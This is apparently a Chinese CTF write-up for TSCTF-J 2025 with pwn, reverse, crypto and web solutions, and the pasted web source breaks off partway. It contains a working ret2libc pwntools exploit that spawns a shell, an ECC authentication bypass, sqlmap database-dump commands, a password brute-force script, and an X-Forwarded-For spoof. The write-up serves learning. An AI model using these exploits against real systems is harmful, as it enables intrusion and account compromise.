0x000000000040071b : add byte ptr [rax], al ; add byte ptr [rax], al ; add bl, dh ; ret
0x00000000004004e7 : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x4004d0
0x000000000040058c : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
0x000000000040071c : add byte ptr [rax], al ; add byte ptr [rax], al ; repz ret
0x00000000004004c3 : add byte ptr [rax], al ; add rsp, 8 ; ret
0x00000000004004e9 : add byte ptr [rax], al ; jmp 0x4004d0
0x000000000040058e : add byte ptr [rax], al ; pop rbp ; ret
0x000000000040071e : add byte ptr [rax], al ; repz ret
0x0000000000400608 : add byte ptr [rbp + 5], dh ; jmp 0x4005a0
0x00000000004005f8 : add byte ptr [rcx], al ; repz ret
0x0000000000400700 : add dword ptr [rax + 0x39], ecx ; jmp 0x40077a
0x00000000004004f7 : add dword ptr [rax], eax ; add byte ptr [rax], al ; jmp 0x4004d0
0x00000000004005f4 : add eax, 0x200a6e ; add ebx, esi ; ret
0x0000000000400517 : add eax, dword ptr [rax] ; add byte ptr [rax], al ; jmp 0x4004d0
0x00000000004006db : add ebp, eax ; iretd
0x00000000004005f9 : add ebx, esi ; ret
0x00000000004004c6 : add esp, 8 ; ret
0x00000000004004c5 : add rsp, 8 ; ret
0x00000000004005f7 : and byte ptr [rax], al ; add ebx, esi ; ret
0x00000000004004e4 : and byte ptr [rax], al ; push 0 ; jmp 0x4004d0
0x00000000004004f4 : and byte ptr [rax], al ; push 1 ; jmp 0x4004d0
0x0000000000400504 : and byte ptr [rax], al ; push 2 ; jmp 0x4004d0
0x0000000000400514 : and byte ptr [rax], al ; push 3 ; jmp 0x4004d0
0x0000000000400502 : and cl, byte ptr [rbx] ; and byte ptr [rax], al ; push 2 ; jmp 0x4004d0
0x0000000000400648 : call qword ptr [rax + 0x4855c3c9]
0x0000000000400803 : call qword ptr [rax]
0x0000000000400625 : call qword ptr [rbp + 0x48]
0x000000000040061e : call rax
0x0000000000400606 : cmp dword ptr [rdi], 0 ; jne 0x400610 ; jmp 0x4005a0
0x0000000000400605 : cmp qword ptr [rdi], 0 ; jne 0x400610 ; jmp 0x4005a0
0x00000000004006fc : fmul qword ptr [rax - 0x7d] ; ret
0x00000000004006d6 : in al, dx ; or byte ptr [rax - 0x3f], cl ; std ; add ebp, eax ; iretd
0x0000000000400619 : int1 ; push rbp ; mov rbp, rsp ; call rax
0x00000000004006dd : iretd
0x000000000040057d : je 0x400590 ; pop rbp ; mov edi, 0x601048 ; jmp rax
0x00000000004005cb : je 0x4005d8 ; pop rbp ; mov edi, 0x601048 ; jmp rax
0x0000000000400618 : je 0x40060b ; push rbp ; mov rbp, rsp ; call rax
0x00000000004004eb : jmp 0x4004d0
0x000000000040060b : jmp 0x4005a0
0x0000000000400703 : jmp 0x40077a
0x000000000040086b : jmp qword ptr [rbp]
0x000000000040082b : jmp qword ptr [rsi]
0x0000000000400585 : jmp rax
0x0000000000400609 : jne 0x400610 ; jmp 0x4005a0
0x000000000040064a : leave ; ret
0x00000000004005f3 : mov byte ptr [rip + 0x200a6e], 1 ; repz ret
0x00000000004006a0 : mov eax, 0 ; pop rbp ; ret
0x000000000040061c : mov ebp, esp ; call rax
0x0000000000400580 : mov edi, 0x601048 ; jmp rax
0x000000000040061b : mov rbp, rsp ; call rax
0x0000000000400649 : nop ; leave ; ret
0x0000000000400588 : nop dword ptr [rax + rax] ; pop rbp ; ret
0x0000000000400718 : nop dword ptr [rax + rax] ; repz ret
0x00000000004005d5 : nop dword ptr [rax] ; pop rbp ; ret
0x00000000004005f6 : or ah, byte ptr [rax] ; add byte ptr [rcx], al ; repz ret
0x00000000004006d7 : or byte ptr [rax - 0x3f], cl ; std ; add ebp, eax ; iretd
0x00000000004005cc : or ebx, dword ptr [rbp - 0x41] ; adc byte ptr [rax], spl ; jmp rax
0x00000000004005f5 : outsb dx, byte ptr [rsi] ; or ah, byte ptr [rax] ; add byte ptr [rcx], al ; repz ret
0x000000000040070c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040070e : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400710 : pop r14 ; pop r15 ; ret
0x0000000000400712 : pop r15 ; ret
0x0000000000400620 : pop rbp ; jmp 0x4005a0
0x00000000004005f2 : pop rbp ; mov byte ptr [rip + 0x200a6e], 1 ; repz ret
0x000000000040057f : pop rbp ; mov edi, 0x601048 ; jmp rax
0x000000000040070b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040070f : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400590 : pop rbp ; ret
0x0000000000400713 : pop rdi ; ret
0x0000000000400711 : pop rsi ; pop r15 ; ret
0x000000000040070d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004004e6 : push 0 ; jmp 0x4004d0
0x00000000004004f6 : push 1 ; jmp 0x4004d0
0x0000000000400506 : push 2 ; jmp 0x4004d0
0x0000000000400516 : push 3 ; jmp 0x4004d0
0x000000000040061a : push rbp ; mov rbp, rsp ; call rax
0x00000000004005fa : repz ret
0x00000000004004c9 : ret
0x00000000004005ca : sal byte ptr [rbx + rcx + 0x5d], 0xbf ; adc byte ptr [rax], spl ; jmp rax
0x000000000040057c : sal byte ptr [rcx + rdx + 0x5d], 0xbf ; adc byte ptr [rax], spl ; jmp rax
0x0000000000400617 : sal byte ptr [rcx + rsi*8 + 0x55], 0x48 ; mov ebp, esp ; call rax
0x0000000000400512 : sbb cl, byte ptr [rbx] ; and byte ptr [rax], al ; push 3 ; jmp 0x4004d0
0x00000000004006da : std ; add ebp, eax ; iretd
0x00000000004004f2 : sub cl, byte ptr [rbx] ; and byte ptr [rax], al ; push 1 ; jmp 0x4004d0
0x0000000000400725 : sub esp, 8 ; add rsp, 8 ; ret
0x0000000000400724 : sub rsp, 8 ; add rsp, 8 ; ret
0x000000000040058a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
0x000000000040071a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; repz ret
0x0000000000400616 : test eax, eax ; je 0x40060b ; push rbp ; mov rbp, rsp ; call rax
0x0000000000400615 : test rax, rax ; je 0x40060b ; push rbp ; mov rbp, rsp ; call rax
0x00000000004004e2 : xor cl, byte ptr [rbx] ; and byte ptr [rax], al ; push 0 ; jmp 0x4004d0
```

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

# p = process('./pwn')
p = remote("127.0.0.1",61839)
elf = ELF('./pwn') 
libc = ELF('./libc-2.23.so')

pop_rdi = 0x0400713
ret = 0x04004c9
puts_plt = 0x04004E0
vuln_addr = 0x0400626

# 泄露 libc
offset = 16 + 8
payload1 = b'A' * offset
payload1 += p64(pop_rdi)
payload1 += p64(elf.got['puts'])
payload1 += p64(puts_plt)
payload1 += p64(vuln_addr)

p.sendlineafter(b"No backdoors this time!", payload1)
p.recvline()
leak = u64(p.recv(6).ljust(8, b'\x00'))

# 计算地址
libc_base = leak - libc.symbols['puts']
system = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search(b'/bin/sh'))

# 获取 shell
payload2 = b'A' * offset
payload2 += p64(ret)      # 栈对齐
payload2 += p64(pop_rdi)
payload2 += p64(binsh)
payload2 += p64(system)

p.sendlineafter(b"No backdoors this time!", payload2)
p.interactive()
```

![](imgs/image-20251010111514969.png)

## Reverse

### 题目名称 Singin

```python
import base64

encrypted_data = bytes([
    0x23, 0x7C, 0x34, 0x61, 0x32, 0x02, 0x13, 0x3D,
    0x67, 0x12, 0x64, 0x0D, 0x37, 0x02, 0x34, 0x14,
    0x03, 0x7A, 0x2B, 0x69, 0x24, 0x70, 0x34,
    0x61, 0x32, 0x70, 0x6B, 0x76, 0x02, 0x42, 0x28
])

def create_custom_table():
    original_table = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    table_list = list(original_table)
    
    for i in range(64):
        j = (7 * i + 5) % 64
        table_list[i], table_list[j] = table_list[j], table_list[i]
    
    return ''.join(table_list)

def custom_b64encode(data):
    custom_table = create_custom_table()
    standard_encoded = base64.b64encode(data).decode('ascii')
    standard_table = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    translation_table = str.maketrans(standard_table, custom_table)
    return standard_encoded.translate(translation_table)

# 生成key
welcome_str = b"WelcomeToTSCTF"
key = custom_b64encode(welcome_str).encode('ascii')

print(f"Custom base64 table: {create_custom_table()}")
print(f"Key: {key}")

# 解密
flag = bytearray()
for i in range(len(encrypted_data)):
    flag.append(encrypted_data[i] ^ key[i % len(key)])

print(f"Flag: {flag.decode('ascii', errors='ignore')}")

# Custom base64 table: VkbKJo3PNcCSZQGXdUaLEwOet07jxAWmlsDqp9uf1Riy5F2nIB6rh4/+g8TzMYHv
# Key: b'w/w5t/YF0wUnwoQKwJt='
# Flag: TSCTF-J{We1c@me_t0_TS_CTF_2025}
```

### 题目名称 CryDancing

根据题面信息搜了一下，得到如下内容

![](imgs/image-20251010182840474.png)

把 ipa 文件改后缀为.zip 并解压，然后用 IDA 反编译 CryDancing

![](imgs/image-20251010183252791.png)

定位加密逻辑，提取偏移量

![](imgs/image-20251010183131906.png)

发现密钥是由一个四字节的字符串重复四次构成的，并且 MD5 值为：`674040176a34f6c994003fe85badfc48`

![](imgs/image-20251010182752401.png)

可以谷歌搜题目名字代表的这首歌，也可以直接 CMD5 反查

![](imgs/image-20251010182811426.png)

已知加密算法、密钥和 IV ，最后写个脚本解 AES 即可

```python
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def decrypt_lync_secret(encrypted_base64):
    key = b"NOTDNOTDNOTDNOTD"
    iv = b'\x77\x01\x00\x00' + b'\x00' * 12
    encrypted_data = base64.b64decode(encrypted_base64)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted_data = cipher.decrypt(encrypted_data)
    decrypted_data = unpad(decrypted_data, AES.block_size)
    return decrypted_data.decode('utf-8')

if __name__ == "__main__":
    encrypted_text = "bvOaEEh1F5pDkMpM6n5src+Jym4ineiRvbWRIidoLHD1KGuRk8vyRsDpQ4XGYtNKnQDvFBEnG3DsCDGqJ8Xv8g=="
    decrypted_text = decrypt_lync_secret(encrypted_text)
    print(f"{decrypted_text}")
    # TSCTF-J{S0rry_th3_4nswer_h4s_n0thing_2_do_with_l7rics}
```

### 题目名称 听绿的秘密

附件压缩包中给了如下文件

![](imgs/image-20251010225807380.png)

hint.txt 中的内容如下：

```
java -jar Tinglv.jar Cat.png Where_is_my_cat.png
Try to find the cat!!!
```

jadx-gui 反编译 jar 文件可以得到如下代码

![](imgs/image-20251010225937698.png)

```java
package defpackage;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;

/* loaded from: Tinglv.jar:Runner.class */
public class Runner {

    /* loaded from: Tinglv.jar:Runner$CustomClassLoader.class */
    static class CustomClassLoader extends ClassLoader {
        private final String resourceName;

        public CustomClassLoader(String str) {
            this.resourceName = str;
        }

        @Override // java.lang.ClassLoader
        protected Class<?> findClass(String str) throws ClassNotFoundException {
            try {
                InputStream resourceAsStream = getResourceAsStream(this.resourceName);
                try {
                    if (resourceAsStream == null) {
                        throw new ClassNotFoundException("Resource not found: " + this.resourceName);
                    }
                    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                    byte[] bArr = new byte[1024];
                    while (true) {
                        int read = resourceAsStream.read(bArr, 0, bArr.length);
                        if (read == -1) {
                            break;
                        }
                        byteArrayOutputStream.write(bArr, 0, read);
                    }
                    byteArrayOutputStream.flush();
                    byte[] byteArray = byteArrayOutputStream.toByteArray();
                    byte[] bArr2 = new byte[byteArray.length];
                    for (int i = 0; i < byteArray.length; i++) {
                        bArr2[i] = (byte) (byteArray[i] - 7);
                    }
                    Class<?> defineClass = defineClass(str, bArr2, 0, bArr2.length);
                    if (resourceAsStream != null) {
                        resourceAsStream.close();
                    }
                    return defineClass;
                } finally {
                }
            } catch (IOException e) {
                throw new ClassNotFoundException("Can't read this: " + str, e);
            }
        }
    }

    public static void main(String[] strArr) {
        try {
            new CustomClassLoader("Secret.obf").loadClass("Secret").getMethod("main", String[].class).invoke(null, strArr);
        } catch (Exception e) {
            System.err.println("Error: " + e.getMessage());
            e.printStackTrace();
        }
    }
}
```

发现加载了Secret.obf，并且加载过程中需要把每个字节都减去 7，因此我们写个脚本解密下即可

```python
def decrypt_obf_file(encrypted_file_path, output_file_path):
    with open(encrypted_file_path, 'rb') as f:
        encrypted_data = f.read()
    
    # 解密数据：每个字节减7
    decrypted_data = bytearray()
    for byte in encrypted_data:
        decrypted_byte = (byte - 7) & 0xFF  # 确保在0-255范围内
        decrypted_data.append(decrypted_byte)
    
    with open(output_file_path, 'wb') as f:
        f.write(decrypted_data)
    
    return True

def main():
    encrypted_file = "Secret.obf"
    output_file = "secret.class"
    decrypt_obf_file(encrypted_file, output_file)

if __name__ == "__main__":
    main()
```

解密后得到一个 .class 文件，用在线网站反编译：https://jdec.app/

可以得到如下代码：

![](imgs/image-20251010230349674.png)

```java
import java.nio.file.Files;
import java.nio.file.OpenOption;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Arrays;

public class Secret {
   public static void main(String[] var0) throws Exception {
      if (var0.length < 2) {
         System.out.println("2 args required.");
      } else {
         Path var1 = Paths.get(var0[0]);
         Path var2 = Paths.get(var0[1]);
         byte[] var3 = Files.readAllBytes(var1);
         byte[] var4 = Arrays.copyOf(var3, var3.length);
         int var5 = 123;

         for(int var6 = 0; var6 < var4.length; ++var6) {
            int var7 = var4[var6] & 255;
            int var8 = (var6 + var5) % 8;
            int var9 = var7 + var6 % 251 + var5 & 255;
            int var10;
            if (var8 == 0) {
               var10 = var9;
            } else {
               var10 = (var9 << var8 | var9 >>> 8 - var8) & 255;
            }

            var4[var6] = (byte)var10;
            var5 = var5 + var10 + 37 & 255;
         }

         Files.write(var2, var4, new OpenOption[0]);
         System.out.println("Done.");
      }
   }
}
```

因此我们对照着加密逻辑写个脚本还原图片即可

```python
import sys
import os

def decrypt_image(encrypted_file_path, output_file_path):
    with open(encrypted_file_path, 'rb') as f:
        encrypted_data = bytearray(f.read())
    
    # 解密数据
    decrypted_data = bytearray(len(encrypted_data))
    key = 123  # 初始密钥，与Java代码一致
    
    for i in range(len(encrypted_data)):
        encrypted_byte = encrypted_data[i] & 0xFF
        shift = (i + key) % 8
        # 反向旋转操作（循环右移）
        if shift == 0:
            rotated = encrypted_byte
        else:
            # 循环右移：与Java中的左移相反
            rotated = ((encrypted_byte >> shift) | (encrypted_byte << (8 - shift))) & 0xFF
        # 反向加法运算
        original_byte = (rotated - (i % 251) - key) & 0xFF
        decrypted_data[i] = original_byte
        # 更新密钥（必须与加密时使用相同的加密字节）
        key = (key + encrypted_byte + 37) & 0xFF
    
    # 保存解密后的文件
    with open(output_file_path, 'wb') as f:
        f.write(decrypted_data)
        
    return True

def main():
    encrypted_file = "Where_is_my_cat.png"
    output_file = "flag.png"
    decrypt_image(encrypted_file, output_file)

if __name__ == "__main__":
    main()
```

![](imgs/image-20251010230637919.png)



## Crypto

### 题目名称 Sign in

```python
import base64

KEY1 = bytes.fromhex('a6c8b6733c9b22de7bc0253266a3867df55acde8635e19c73313c1819383df93')
KEY2_XOR_KEY1 = bytes.fromhex('b38dc315bb7c75e3c9fa84f123898ff684fd36189e83c422cf0d2804c12b4c83')
KEY2_XOR_KEY3 = bytes.fromhex('11abed33a76d7be822ab718422844e1d40d72a96f02a288aa3b168165922138f')
FLAG_XOR_ALL = bytes.fromhex('e1251504cdb300420a0520fc1c15b010d4bfb118c2477b78f3eafbe1acf0f121')


KEY2 = bytes(a ^ b for a, b in zip(KEY2_XOR_KEY1, KEY1))
KEY3 = bytes(a ^ b for a, b in zip(KEY2_XOR_KEY3, KEY2))
FLAG_XORED = bytes(a ^ b ^ c ^ d for a, b, c, d in zip(FLAG_XOR_ALL, KEY1, KEY2, KEY3))

flag_hex = FLAG_XORED.hex()
flag_bytes = bytes.fromhex(flag_hex)
flag = base64.b64decode(flag_bytes).decode()
print(f"{flag}")
# TSCTF-J{I_like_Crypto}
```

### 题目名称 Cantor's gifts

```python
from math import factorial

# 给定的扰乱后的信息
hint = 2498752981111460725490082182453813672840574
hint2 = b'5__r0tfg5f_34rtm__t_0ury0hft0t3n11c_t'

# 还原过程：通过 hint 逆推排列
def recover_permutation(hint, n):
    permutation = []
    remaining_elements = list(range(1, n + 1))  # 1 to n
    for i in range(n):
        factorial_part = factorial(n - i - 1)
        index = hint // factorial_part
        permutation.append(remaining_elements.pop(index))
        hint %= factorial_part
    return permutation

# 将扰乱后的字符串和恢复的排列结合，恢复原始消息
def recover_message(permutation, hint2):
    original_message = [None] * len(hint2)
    for i, pos in enumerate(permutation):
        original_message[pos - 1] = hint2[i:i+1]  # 恢复原始位置
    return b''.join(original_message)

# 恢复排列
n = len(hint2)
recovered_permutation = recover_permutation(hint, n)

# 恢复原始消息
original_message = recover_message(recovered_permutation, hint2)
flag = b'TSCTF-J{' + original_message + b'}'
print(flag)
# b'TSCTF-J{c4nt0r5_g1ft_f0r_th3_f1r5t_y0u_t0_m3t}'
```

### 题目名称 p=~q

```python
from math import isqrt
from Crypto.Util.number import long_to_bytes

n = 17051407421191257766878232954687995776275810092183184400406052880776283989210979642731778073370935322411364098277851627904479300390445258684605069414401583042318910193017463817007183769745191345053634189302047446965986220310713141272104307300803560476507359063543147558286276881771260972717080160544078251002420560031692800880310702557545555020333582797788637377901506395695115351043959528307703535156759957098992921231240480724115372547821536358993064005667175508572424424498140029596238691489470392031290179060300593482514446687661068760457021164559923920591924277937814270216802997593891640228684835585559706493543
c = 6853848340403815994585475502319517119889957571722212403728096345969080424626781659085329098693249503884838912886399198433606071464349852827030377680456139046436386063565577131001152891176064224036780277315958771309063181054101040906120879494157473100295607616604515810676954786850526056316144848921849017030095717895244910724234927693999607754055953250981051858498499963202512464388765761597435963200846457903991924487952495202449073962133164877330289865956477568456497103568127103331224273528931042804794039714404647322385366048042459109584024130199496106946124782839099804356052016687352504438568019898976023369460
e = 0x10001

# 尝试 k = 1024
k = 1024
p_plus_q = 3 * (2**(k-1))

# 计算 p - q
D = p_plus_q**2 - 4*n
sqrt_D = isqrt(D)
if sqrt_D * sqrt_D == D:
    p = (p_plus_q + sqrt_D) // 2
    q = (p_plus_q - sqrt_D) // 2
    if p * q == n:
        print("p =", p)
        print("q =", q)
    else:
        print("Not this k")
else:
    print("k =", k, "failed, try k = 1023")

phi = (p-1)*(q-1)
d = pow(e, -1, phi)
m = pow(c, d, n)
flag = long_to_bytes(m)
print(flag)
# b'TSCTF-J{The_easiest_RSA_key!}'
```

### 题目名称 野狐禅

```python
from Crypto.Util.number import long_to_bytes
import sympy

def parse_challenge_file(filename="challenge.txt"):
    with open(filename, 'r') as f:
        lines = f.readlines()

    data = {}
    data['n'] = int(lines[0].split(': ')[1])
    data['g'] = int(lines[1].split(': ')[1])
    data['k'] = int(lines[2].split(': ')[1])
    data['eqs'] = int(lines[3].split(': ')[1])

    num_ciphertexts = 2 * data['k']
    ciphertexts = [int(line.strip()) for line in lines[4 : 4 + num_ciphertexts]]
    
    lcg_raws = [int(line.strip()) for line in lines[4 + num_ciphertexts : 4 + 2 * num_ciphertexts]]

    return data, ciphertexts, lcg_raws

def decrypt_y_sequence(data, ciphertexts, lcg_raws):
    n = data['n']
    n2 = n * n
    k = data['k'] 
    y = []

    for i in range(2 * k):
        c = ciphertexts[i]
        raw = lcg_raws[i]
        r = raw % n
        
        # 计算 r^n mod n^2 的逆元
        try:
            # r=0的情况
            if r == 0:
                y.append(0)
                continue
            r_n = pow(r, n, n2)
            r_n_inv = pow(r_n, -1, n2)
        except ValueError:
            print(f"Error: r={r} is not invertible modulo n2. This should not happen.")
            return None

        # c' = c * (r^n)^-1 mod n^2
        c_prime = (c * r_n_inv) % n2
        
        # m = (c' - 1) / n
        m = (c_prime - 1) // n
        y.append(m)

    print("[+] Successfully decrypted the full y sequence.")
    return y

def solve_linear_system(k, y):
    print("[*] Building the linear system Ax = b...")
    
    # A * coeffs = b
    # b 是 y 序列的后半部分
    b = y[k:]
    
    # A 是一个 k x k 的矩阵
    A_list = []
    for i in range(k):
        # 构造矩阵的每一行
        # y[k+i] = sum(coeffs[j] * y[k+i-1-j])
        # A_row = [y[k+i-1], y[k+i-2], ..., y[i]]
        row = y[k + i - 1 : i - 1 if i > 0 else None : -1]
        A_list.append(row)
    
    print("[*] Solving for coefficients using SymPy for an exact solution...")
    try:
        # 使用SymPy进行精确的有理数运算求解
        A_sym = sympy.Matrix(A_list)
        b_sym = sympy.Matrix(b)
        
        # 求解 Ax = b
        coeffs_sym = A_sym.LUsolve(b_sym)
        
        # 将解转换为整数列表
        coeffs = [int(c) for c in coeffs_sym]
        
        print("[+] Coefficients found:", coeffs)
        return coeffs
    except sympy.matrices.common.NonInvertibleMatrixError:
        print("Error: The matrix A is singular (as determined by SymPy). Cannot find a unique solution.")
        return None
    except Exception as e:
        print(f"An unexpected error occurred while solving with SymPy: {e}")
        return None

def reconstruct_flag(coeffs):
    flag_int = 0
    for i in range(len(coeffs)):
        flag_int += coeffs[i] * (3**i)
    
    flag = long_to_bytes(flag_int)
    return flag.decode()

def main():
    data, ciphertexts, lcg_raws = parse_challenge_file()
    y = decrypt_y_sequence(data, ciphertexts, lcg_raws)
    coeffs = solve_linear_system(data['k'], y)
    flag = reconstruct_flag(coeffs)
    print(f"flag: {flag}")

if __name__ == "__main__":
    main()
    
# [+] Successfully decrypted the full y sequence.
# [*] Building the linear system Ax = b...
# [*] Solving for coefficients using SymPy for an exact solution...
# [+] Coefficients found: [2, 1, 2, 1, 1, 0, 0, 0, 2, 1, 1, 2, 1, 0, 2, 0, 2, 0, 2, 0, 2, 2, 2, 2, 1, 1, 2, 1, 0, 2, 1, 1, 0, 2, 0, 0, 2, 0, 1, 1, 2, 1, 2, 1, 1, 2, 0, 2, 1, 0, 0, 1, 1, 0, 0, 2, 1, 2, 1, 0, 1, 1, 1, 0, 1, 0, 2, 1, 2, 0, 1, 0, 2, 0, 2]
# flag: We_sh0u1d_kn0w!
```

### 题目名称  Microsoft's gifts

题目附件给的源代码如下：

```python
import random
from typing import Tuple, Optional
from Crypto.Util.number import inverse

class EllipticCurve:
    def __init__(self, a: int, b: int, p: int, g: Tuple[int, int], name: str = "secp256r1"):
        self.a = a
        self.b = b
        self.p = p
        self.g = g
        self.name = name
    
    def is_on_curve(self, point: Optional[Tuple[int, int]]) -> bool:
        if point is None:
            return True
        
        x, y = point
        return (y * y - x * x * x - self.a * x - self.b) % self.p == 0
    
    def add(self, p1: Optional[Tuple[int, int]], p2: Optional[Tuple[int, int]]) -> Optional[Tuple[int, int]]:
        if p1 is None:
            return p2
        if p2 is None:
            return p1
        
        x1, y1 = p1
        x2, y2 = p2
        
        if x1 == x2 and y1 != y2:
            return None
        
        if x1 == x2:
            m = (3 * x1 * x1 + self.a) * inverse(2 * y1, self.p)
        else:
            m = (y1 - y2) * inverse(x1 - x2, self.p)
        
        m %= self.p
        x3 = (m * m - x1 - x2) % self.p
        y3 = (y1 + m * (x3 - x1)) % self.p
        y3 = (-y3) % self.p
        
        return (x3, y3)
    
    def multiply(self, k: int, point: Optional[Tuple[int, int]]) -> Optional[Tuple[int, int]]:
        if point is None:
            return None
        
        if k < 0:
            return self.multiply(-k, self.negate(point))
        
        result = None
        addend = point
        
        while k:
            if k & 1:
                result = self.add(result, addend)
            addend = self.add(addend, addend)
            k >>= 1
        
        return result
    
    def negate(self, point: Optional[Tuple[int, int]]) -> Optional[Tuple[int, int]]:
        if point is None:
            return None
        
        x, y = point
        return (x, (-y) % self.p)


if __name__ == "__main__":
    from ecdsa.secp256r1 import p, a, b, g, n
    assert g == (0xAB810FFEEDCDDDDDDDDDDDDDDDDDD14072846639338962BA3CCD672905844000, 0xEEF7CDA2DC7B65D4FC3EF49B2893974BF97FD4F1082CB4791362CAC30E8841C)
    E = EllipticCurve(a, b, p, g)
    public_key = E.multiply(random.randint(2, n - 1), g)

    print("Connecting...")
    print(f"Connected to TSCTF-J, the public key is {hex(public_key[0]), hex(public_key[1])}")

    print("=" * 60)
    print("Welcome to TSCTF-J! We should check if you are real administrator:")
    print("=" * 60)

    print("Tell me your curve now: [p, a, b]")
    user_curve = input()
    try:
        p_in, a_in, b_in = eval(user_curve)
    except Exception:
        print("Invalid input format. Please enter as [p, a, b].")
        exit(1)

    print("Tell me your g which is on the curve: [gx, gy]")
    user_g = input()
    try:
        gx_in, gy_in = eval(user_g)
        user_point = (gx_in, gy_in)
    except Exception:
        print("Invalid input format. Please enter as [gx, gy].")
        exit(1)

    user_curve_obj = EllipticCurve(a_in, b_in, p_in, user_point)
    if not user_curve_obj.is_on_curve(user_point):
        print("The point G is not on the given curve.")
        exit(1)

    print("Curve and point accepted.")
    print("=" * 60)
    print("Tell me your private_key: key")
    try:
        private_key = int(input())
    except Exception:
        print("Invalid private key format.")
        exit(1)

    if abs(private_key) <= 1:
        print("Not secure key!")
        exit(1)

    from secret import flag

    user_pub = user_curve_obj.multiply(private_key, user_point)
    if user_pub == public_key:
        print(f"Welcome back! Administrator. {flag}")
    else:
        print("Sorry, authentication failed.")
        exit(1)
```

椭圆曲线加密，构造恶意曲线，选择基点和私钥让 `user_pub` 等于 `public_key` 即可

```python
import re
from pwn import *
from ecdsa import curves

c = curves.NIST256p
CURVE_P = c.curve.p()
CURVE_A = c.curve.a()
CURVE_B = c.curve.b()
CURVE_N = c.order

HOST = "127.0.0.1"
PORT = 56313

def main():
    r = remote(HOST, PORT, timeout=10)
    banner = r.recvuntil(b"Tell me your curve now: [p, a, b]\n", timeout=5).decode(errors="ignore")
    hexes = re.findall(r'0x[0-9a-fA-F]+', banner)

    gx_hex, gy_hex = hexes[0], hexes[1]
    print(f"[+] 解析到服务器公钥 P = ({gx_hex}, {gy_hex})")

    # 发送曲线参数 [p, a, b]
    curve_line = f"[{CURVE_P}, {CURVE_A}, {CURVE_B}]\n"
    print("[+] 发送 curve:", curve_line.strip())
    r.send(curve_line.encode())

    r.recvuntil(b"Tell me your g which is on the curve: [gx, gy]\n", timeout=5)
    # 发送 g = 服务器公钥（保留 hex 格式）
    g_line = f"[{gx_hex}, {gy_hex}]\n"
    print("[+] 发送 g (server 公钥) :", g_line.strip())
    r.send(g_line.encode())

    r.recvuntil(b"Tell me your private_key: key\n", timeout=5)
    # 发送私钥 n+1（满足 abs(private_key)>1 且 (n+1)*P = P）
    private_key = CURVE_N + 1
    print("[+] 发送 private_key:", private_key)
    r.send(f"{private_key}\n".encode())

    resp = r.recvall(timeout=5).decode(errors="ignore")
    print(f"服务器返回：{resp}")
    r.close()

if __name__ == "__main__":
    main()
```

![](imgs/image-20251012201251832.png)

## Web

### 题目名称 EZ_SQL

直接用 sqlmap 一把梭了

```bash
sqlmap -u http://127.0.0.1:54800 --data='id=1'
sqlmap -u http://127.0.0.1:54800 --data='id=1' -dbs
sqlmap -u http://127.0.0.1:54800 --data='id=1' -D welcome --tables
sqlmap -u http://127.0.0.1:54800 --data='id=1' -D welcome -T flag --dump
```

![](imgs/image-20251010160500868.png)

### 题目名称 EZ_Login（签到）

![](imgs/image-20251010170419139.png)

题目提示了弱密码，直接抓包写个脚本爆破即可得到管理员密码：`simple`

```python
import re
import requests
import sys

def get_captcha(session):
    url = "http://127.0.0.1:60059/login"

    res = session.get(url)
    # print(res.status_code)
    html_data = res.text
    captcha_list = re.findall(r"/static/captcha_images/(.*?)\.png", html_data)
    
    return "".join(captcha_list)

def login_func(session, captcha,passwd):
    print(f"[+] 当前尝试的密码为: {passwd}")
    url = "http://127.0.0.1:60059/login"
    data = {
        "username": "admin",
        "password": passwd,
        "captcha": captcha
    }
    res = session.post(url, data=data)
    # print(res.status_code)
    print(res.text)
    if "错误" not in res.text:
        print(f"[+] 管理员密码为: {passwd}")
        sys.exit(-1)

if __name__ == '__main__':
    # 创建会话对象
    with requests.Session() as session:
        with open("rockyou.txt",'r',encoding='utf-8',errors='ignore') as f:
            passwd_list = f.read().split()
        for passwd in passwd_list:
            if passwd[0] == 's':
                captcha = get_captcha(session)
                print(f"[+] 获取到的验证码: {captcha}")
                login_func(session, captcha,passwd)
            else:
                continue
```

![](imgs/image-20251010165359711.png)

直接登录会提示你不是本地管理员

![](imgs/image-20251010170450033.png)

加个`X-Forwarded-For:127.0.0.1` 就能过检测

![](imgs/image-20251010170502876.png)

然后把返回的 jwt token 解个 base64 即可得到 flag

![](imgs/image-20251010170519701.png)

### 题目名称 Druid

题面信息如下：

> 找到H2数据库的用户名，提交时请用TSCTF-J{}包裹

直接访问容器会得到如下页面

![](imgs/image-20251011144948687.png)

问了一下 AI，知道了 Druid 连接池是有后台的

![](imgs/image-20251011145001095.png)

试了一下第一个，得到如下页面

![](imgs/image-20251011145056075.png)

尝试了用户名 `admin` 和密码 `admin`，可以正常登录后台，然后查看数据源即可

![](imgs/image-20251011145246219.png)

`TSCTF-J{Y0v_S22_Dru1d}`

### 题目名称 EZ_PY

访问题目容器，可以看到如下页面

![](imgs/image-20251011171419296.png)

查看源代码，发现有提示

![](imgs/image-20251011171442274.png)

访问这个路由可以得到网站源码：

```python
import random
import string
from flask import Flask, request, jsonify, render_template_string
from functools import wraps
import jwt

app = Flask(__name__)
app.config['SECRET_KEY'] = ''.join(random.sample(string.ascii_letters + string.digits, 24))

# 用户数据库
users = {
    "c1432": "123456"
}


def make_response(message: str, code: int = 200, data=None):
    """
    Unified response format
    """
    resp = {'message': message}
    if data is not None:
        resp['data'] = data
    return jsonify(resp), code


